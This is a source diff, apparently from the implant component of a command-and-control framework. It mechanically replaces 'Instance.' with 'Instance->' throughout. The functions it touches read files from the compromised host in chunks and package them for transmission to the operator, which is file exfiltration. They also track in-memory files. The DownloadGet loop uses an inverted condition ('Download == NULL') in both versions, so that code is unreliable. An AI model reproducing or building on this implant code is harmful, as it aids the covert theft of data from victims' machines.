@@ -12,13 +12,13 @@ PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, LONGLONG MaxSize )
     Download->hFile     = hFile;
     Download->Size      = MaxSize;
     Download->State     = DOWNLOAD_STATE_RUNNING;
-    Download->Next      = Instance.Downloads;
-    Download->RequestID = Instance.CurrentRequestID;
+    Download->Next      = Instance->Downloads;
+    Download->RequestID = Instance->CurrentRequestID;
 
     /* Push to linked list */
-    Instance.Downloads = Download;
+    Instance->Downloads = Download;
 
-    PRINTF( "Instance.Downloads => %p\n", Instance.Downloads )
+    PRINTF( "Instance->Downloads => %p\n", Instance->Downloads )
 
     return Download;
 }
@@ -28,7 +28,7 @@ PDOWNLOAD_DATA DownloadGet( DWORD FileID )
 {
     PDOWNLOAD_DATA Download = NULL;
 
-    for ( Download = Instance.Downloads; Download == NULL; Download = Download->Next )
+    for ( Download = Instance->Downloads; Download == NULL; Download = Download->Next )
     {
         if ( Download->FileID == FileID )
             break;
@@ -59,8 +59,8 @@ BOOL DownloadRemove( DWORD FileID )
     PDOWNLOAD_DATA Last     = NULL;
     BOOL           Success  = FALSE;
 
-    Download = Instance.Downloads;
-    Last     = Instance.Downloads;
+    Download = Instance->Downloads;
+    Last     = Instance->Downloads;
 
     for ( ;; )
     {
@@ -97,17 +97,17 @@ VOID DownloadPush()
     PDOWNLOAD_DATA DownLast = NULL;
     PPACKAGE       Package  = NULL;
 
-    Download = Instance.Downloads;
+    Download = Instance->Downloads;
 
     /* do we actually have downloads pending? */
     if ( ! Download )
     {
         /* we don't have any downloads, free the DownloadChunk if we have one */
-        if ( Instance.DownloadChunk.Buffer )
+        if ( Instance->DownloadChunk.Buffer )
         {
-            MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
-            MmHeapFree( Instance.DownloadChunk.Buffer );
-            Instance.DownloadChunk.Buffer = NULL;
+            MemSet( Instance->DownloadChunk.Buffer, 0, Instance->DownloadChunk.Length );
+            MmHeapFree( Instance->DownloadChunk.Buffer );
+            Instance->DownloadChunk.Buffer = NULL;
         }
 
         return;
@@ -121,12 +121,12 @@ VOID DownloadPush()
 
         /* seems like we have some current downloads
          * allocate a chunk of memory to use for the chunks. */
-        if ( ! Instance.DownloadChunk.Buffer )
+        if ( ! Instance->DownloadChunk.Buffer )
         {
-            Instance.DownloadChunk.Buffer = MmHeapAlloc( Instance.Config.Implant.DownloadChunkSize );
-            Instance.DownloadChunk.Length = Instance.Config.Implant.DownloadChunkSize;
+            Instance->DownloadChunk.Buffer = MmHeapAlloc( Instance->Config.Implant.DownloadChunkSize );
+            Instance->DownloadChunk.Length = Instance->Config.Implant.DownloadChunkSize;
 
-            PRINTF( "Allocated memory for DownloadChunk. Buffer:[%p] Size:[%d]\n", Instance.DownloadChunk.Buffer, Instance.DownloadChunk.Length )
+            PRINTF( "Allocated memory for DownloadChunk. Buffer:[%p] Size:[%d]\n", Instance->DownloadChunk.Buffer, Instance->DownloadChunk.Length )
         }
 
         PRINTF( "Download: %p\n", Download )
@@ -137,9 +137,9 @@ VOID DownloadPush()
             PRINTF( "Download (%x) is in state DOWNLOAD_STATE_RUNNING\n", Download->FileID )
 
             /* Reset memory. */
-            MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
+            MemSet( Instance->DownloadChunk.Buffer, 0, Instance->DownloadChunk.Length );
 
-            if ( ! Instance.Win32.ReadFile( Download->hFile, Instance.DownloadChunk.Buffer, Instance.DownloadChunk.Length, &Read, NULL ) )
+            if ( ! Instance->Win32.ReadFile( Download->hFile, Instance->DownloadChunk.Buffer, Instance->DownloadChunk.Length, &Read, NULL ) )
                 PRINTF( "ReadFile Failed: Error[%d]\n", NtGetLastError() );
 
             Download->Size     -= Read;
@@ -158,7 +158,7 @@ VOID DownloadPush()
                 PackageAddInt32( Package, Download->FileID    );
 
                 /* Download Write data (and only send what we read.) */
-                PackageAddBytes( Package, Instance.DownloadChunk.Buffer, Read );
+                PackageAddBytes( Package, Instance->DownloadChunk.Buffer, Read );
 
                 /* Send that chunk */
                 PUTS( "transmit download chunk" )
@@ -197,7 +197,7 @@ VOID DownloadPush()
         Download = Download->Next;
     }
 
-    Download = Instance.Downloads;
+    Download = Instance->Downloads;
     DownLast = NULL;
 
     /* why do we do that again ?
@@ -212,7 +212,7 @@ VOID DownloadPush()
             /* we are at the beginning. */
             if ( ! DownLast )
             {
-                Instance.Downloads = Download->Next;
+                Instance->Downloads = Download->Next;
                 DownloadFree( Download );
                 Download = NULL;
             }
@@ -231,13 +231,13 @@ VOID DownloadPush()
     }
 
     /* Reset memory. */
-    if ( Instance.DownloadChunk.Buffer )
-        MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
+    if ( Instance->DownloadChunk.Buffer )
+        MemSet( Instance->DownloadChunk.Buffer, 0, Instance->DownloadChunk.Length );
 }
 
 BOOL MemFileIsNew( ULONG32 ID )
 {
-    PMEM_FILE MemFile = Instance.MemFiles;
+    PMEM_FILE MemFile = Instance->MemFiles;
 
     while ( MemFile )
     {
@@ -260,7 +260,7 @@ PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )
     MemFile->Size     = Size;
     MemFile->Data     = MmHeapAlloc( MemFile->Size );
     MemFile->ReadSize = 0;
-    MemFile->Next     = Instance.MemFiles;
+    MemFile->Next     = Instance->MemFiles;
 
     if ( ! MemFile->Data )
     {
@@ -277,7 +277,7 @@ PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )
     PRINTF( "Copying %x bytes, bytes missing: 0x%x\n", ReadSize, MemFile->Size - MemFile->ReadSize )
 
     /* Push to linked list */
-    Instance.MemFiles = MemFile;
+    Instance->MemFiles = MemFile;
 
     PRINTF( "Added a MemFile [%x]\n", MemFile->ID )
 
@@ -286,7 +286,7 @@ PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )
 
 PMEM_FILE GetMemFile( ULONG32 ID )
 {
-    PMEM_FILE MemFile = Instance.MemFiles;
+    PMEM_FILE MemFile = Instance->MemFiles;
 
     while ( MemFile )
     {
@@ -358,12 +358,12 @@ BOOL RemoveMemFile( ULONG32 ID )
     PMEM_FILE Last    = NULL;
     BOOL      Success = FALSE;
 
-    if ( Instance.MemFiles && Instance.MemFiles->Next == NULL )
+    if ( Instance->MemFiles && Instance->MemFiles->Next == NULL )
     {
-        if ( Instance.MemFiles->ID == ID )
+        if ( Instance->MemFiles->ID == ID )
         {
-            MemFileFree( Instance.MemFiles );
-            Instance.MemFiles = NULL;
+            MemFileFree( Instance->MemFiles );
+            Instance->MemFiles = NULL;
             Success = TRUE;
         }
 
@@ -371,8 +371,8 @@ BOOL RemoveMemFile( ULONG32 ID )
         return Success;
     }
 
-    MemFile = Instance.MemFiles;
-    Last    = Instance.MemFiles;
+    MemFile = Instance->MemFiles;
+    Last    = Instance->MemFiles;
 
     for ( ;; )
     {
